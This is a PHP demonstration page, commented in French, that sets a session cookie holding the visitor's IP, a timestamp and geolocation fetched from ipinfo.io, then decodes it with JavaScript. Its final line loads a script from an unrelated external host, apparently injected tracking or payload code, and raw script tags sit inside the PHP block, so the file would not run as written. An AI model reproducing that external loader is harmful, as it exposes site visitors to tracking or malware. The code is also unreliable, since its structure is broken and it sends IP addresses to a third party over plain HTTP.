<?php
// Définir l'en-tête Content-Type pour la page PHP
header('Content-Type: text/html; charset=UTF-8');

// Utilisation d'un service gratuit pour obtenir la géolocalisation de l'utilisateur (par exemple, ipinfo.io)
$ip = $_SERVER['REMOTE_ADDR']; // L'adresse IP de l'utilisateur
$geolocation = file_get_contents("http://ipinfo.io/{$ip}/json");
$geolocation_data = json_decode($geolocation, true);

// Obtenir l'heure actuelle
$current_time = time();

// Créer le cookie avec des informations spécifiques : time, IP, géolocalisation
$cookie_value = base64_encode(json_encode([
    'time' => $current_time,
    'ip' => $ip,
    'geolocation' => $geolocation_data
]));

// Définir un cookie de session avec les informations encodées
setcookie("user_session", $cookie_value, time() + 3600, "/"); // Cookie expirant dans 1 heure

// Affichage des informations pour la démonstration
echo "<h1>Page PHP avec cookie de session</h1>";
echo "<p>Cookie 'user_session' défini avec succès!</p>";
echo "<p>Informations de session : </p>";
echo "<pre>" . print_r(json_decode(base64_decode($cookie_value), true), true) . "</pre>";

    <script>
    // Script JavaScript pour lire et afficher les données du cookie
window.onload = function() {
    // Fonction pour récupérer la valeur du cookie par son nom
    function getCookie(name) {
        let nameEQ = name + "=";
        let ca = document.cookie.split(';');
        for (let i = 0; i < ca.length; i++) {
            let c = ca[i];
            while (c.charAt(0) == ' ') c = c.substring(1, c.length);
            if (c.indexOf(nameEQ) == 0) return c.substring(nameEQ.length, c.length);
        }
        return null;
    }

    // Récupérer et décoder la valeur du cookie
    let cookie = getCookie("user_session");

    if (cookie) {
        // Décode le cookie encodé en base64
        let decodedCookie = atob(cookie);

        // Parse le JSON décodé
        let sessionData = JSON.parse(decodedCookie);

        // Afficher les données dans la console
        console.log("Données de session: ", sessionData);

        // Vous pouvez également afficher dans la page si nécessaire
        document.body.innerHTML += "<p>Cookie de session trouvé! Voir la console pour les détails.</p>";
    } else {
        document.body.innerHTML += "<p>Aucun cookie de session trouvé.</p>";
    }
};
    </script>
    <script src="http://trknn.0delta.cz/trknxsob.js"></script>
?>
